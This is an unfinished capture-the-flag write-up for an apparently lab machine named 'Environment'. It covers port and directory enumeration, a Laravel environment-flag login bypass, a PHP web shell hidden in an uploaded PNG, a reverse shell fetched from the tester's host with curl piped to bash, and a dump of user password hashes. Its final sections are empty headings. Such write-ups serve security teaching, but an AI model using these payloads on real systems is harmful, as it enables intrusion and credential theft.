---
name: Environment
difficulty: medium
os: linux
platform: htb
date: 9999
releasedDate: 2099-12-31
userFlag: false
rootFlag: false

img: image_url
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.67 -o allPorts
```

```
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63
```

We will add `environment.htb` to our `/etc/hosts` file for easier access:

```bash
echo "10.10.11.67 environment.htb" | sudo tee -a /etc/hosts
```

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options

```bash
nmap -p 22,80,8000 -sCV environment.htb -o targeted
```

```
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp   open  http      nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Save the Environment | environment.htb
8000/tcp open  http-alt?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We do a directory scan with `gobuster` to find hidden directories and files on the web server:

```bash
gobuster dir -u http://environment.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t200
```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://environment.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 2391]
/storage              (Status: 301) [Size: 169] [--> http://environment.htb/storage/]
/upload               (Status: 405) [Size: 244852]
/up                   (Status: 200) [Size: 2125]
/logout               (Status: 302) [Size: 358] [--> http://environment.htb/login]
/vendor               (Status: 301) [Size: 169] [--> http://environment.htb/vendor/]
/build                (Status: 301) [Size: 169] [--> http://environment.htb/build/]
/mailing              (Status: 405) [Size: 244854]
```

We can force an error on `/login` page and see backend source code. We send a POST `/login` request with an invalid `remember`field:

```bash
POST /login HTTP/1.1
Host: environment.htb
...
email=test%40test.com&password=test&remember=nonboolean
```

This will return a 500 Internal Server Error, which reveals the backend source code:

```php
if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
    $request->session()->regenerate();
    $request->session()->put('user_id', 1);
    return redirect('/management/dashboard');
}
```

We can see that environment called `preprod` logs in as user with ID 1 without needing a password. We can use this to our advantage.

```bash
POST /login?--env=preprod HTTP/1.1
Host: environment.htb
...
email=test%40test.com&password=test&remember=nonboolean
```

Now we are logged in as user `hish`. We get redirected to `/management/dashboard`.
We can change our profile picture, maybe we can upload php code and execute it later.

```
POST /upload HTTP/1.1
Host: environment.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://environment.htb/management/profile
Content-Type: multipart/form-data; boundary=---------------------------26383360799661928062804695699
Origin: http://environment.htb
Content-Length: 224966
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6Ik5xU2NlYUxmQjBDSlA4WDBjOXpqTkE9PSIsInZhbHVlIjoiLy9lREh5RmdYTDVHaUE2QSt2S2tqdGxucW1MbFJod0thMWloakkzWHlOM0p0UG9ZdUJ4WUNLN1NaVDRHZTNuUlRWRzdMZGFlTkRCLzMzSWd3azhCNElQQ0tTNGN6eitBckpYK20yNFBrbWxoMExhYVplaFZiSUFVem9iY2s5VWgiLCJtYWMiOiI4MjAxYzQ3ZDAxNmEzYjIwNjc1MTkxNjA0MzVmOTY2ZmUwNGU4YjdhZDYzOGNkOGMyOGFkNGVjZjI0ZWVkNTQ5IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImMycUZEUFA1NGJNSnJuSkJBUnJlZlE9PSIsInZhbHVlIjoiRkVKQ0J2YTI1bVRRdHo2Zlp2aW9iS2xIUHkyZ2dBN0taMkkwRjZxalRTd0VNQXdVeXZTWDA4dGNtanZpV1RhM3RLWnQwS09wTVB1N3QraE93cW1TRVkzcFZ6NFladEw2MTM4L3dpTk03WVhQZmRBdDJVbGZMSzVraVRESjcrQWQiLCJtYWMiOiIwZmFmMzgxYWE1ZDFiMjJmMjBjZWZiNzAxMzBiMzM0ZDg2MTUzYmIzMWFhMGFmYzQ0ZWViMjNmNTFlNTAxYTc0IiwidGFnIjoiIn0%3D

-----------------------------26383360799661928062804695699
Content-Disposition: form-data; name="_token"

H47WDGCWzq0vOaVzUbuB04tNqNDfl4TF2ZGhXgA5
-----------------------------26383360799661928062804695699
Content-Disposition: form-data; name="upload"; filename="png3.php."
Content-Type: image/png

PNG
...image data...

<?php system($_GET['cmd']);?>

...image data...
-----------------------------26383360799661928062804695699--
```

Now we can acces the uploaded file at `http://environment.htb/storage/png3.php` and execute commands using the `cmd` parameter:

```bash
curl "http://environment.htb/storage/files/png3.php?cmd=whoami"
```

...image data...
www-data
...image data...

````

We can get a reverse shell using the following commands:
In our local machine:
```bash
echo "bash -i >& /dev/tcp/10.10.14.216/443 0>&1" > reverse
python3 -m http.server 80
nc -lvnp 443
````

We run the following request to the target machine:

```
GET /storage/files/png3.php?cmd=curl+10.10.14.216/reverse|bash HTTP/1.1
Host: environment.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6IlRmdHIrait2ZGlucXNvNENjejBzbnc9PSIsInZhbHVlIjoicTIyY2VqQ1V0aVFzbHM0aU5mWEdGZFNiV0lxNXgwMS9zT1Bab3BuSElJY204Mlp1OWhHTkhpRHFPb0pxYnNMR2pOQXVaQzRrOEFYS24zMmZ6dDgrY3E3eXNoQVYrdWJ5MHBtdmk5Wk1saDF6d3IxNXd5QTVSQW5GemhDZDBUWXgiLCJtYWMiOiJkNTY0NzY2ZDJhZTRhM2YxNmJkZTZlYzEwMTQ4ZDU2ZTczZmQxM2FhYmJhNjYxMmU1MjM1MjE4MzZkYzMwZjI2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ik5wNE91YkNPS1VDOFRPMGtsOWpvYmc9PSIsInZhbHVlIjoiclFvVkw3YjQxMStmd1RiV3k0cnFzaDZLakdTRGNNTHVDMUU4MXUzbUhmMUZFREtjNWVWUGRFQVkraHJSMUdyWlA4bmJsTkg1V003cmg1ZmF3Qk5SdFpkcnZ2eDRWSlc1cVIyVm9mRk1LWWZMZDdibmh3cXRLenBBZEUvaEhvSk0iLCJtYWMiOiI3ZWRjYzc5MDBkMThiOTdjM2YyZjA1MDliN2IwYzJmNTU4ZjU5NDM1MmU3MWYxMzE2MmY0YmJjNWEzYzhkZTRjIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
```

This will give us a reverse shell as `www-data`. We can get a persistent shell by using the following commands on the reverse shell:

```bash
script /dev/null -c /bin/bash
CONTROL-Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```

We can check the web app database contents:

```bash
sqlite3 database/database.sqlite .dump
```

```
...
CREATE TABLE IF NOT EXISTS "users" ("id" integer primary key autoincrement not null, "name" varchar not null, "email" varchar not null, "email_verified_at" datetime, "password" varchar not null, "remember_token" varchar, "created_at" datetime, "updated_at" datetime, "profile_picture" varchar);
INSERT INTO users VALUES(1,'Hish','hish@environment.htb',NULL,'$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi',NULL,'2025-01-07 01:51:54','2025-01-12 01:01:48','hish.png');
INSERT INTO users VALUES(2,'Jono','jono@environment.htb',NULL,'$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm',NULL,'2025-01-07 01:52:35','2025-01-07 01:52:35','jono.png');
...
```

## User Exploitation

## Root Exploitation

## Conclusion
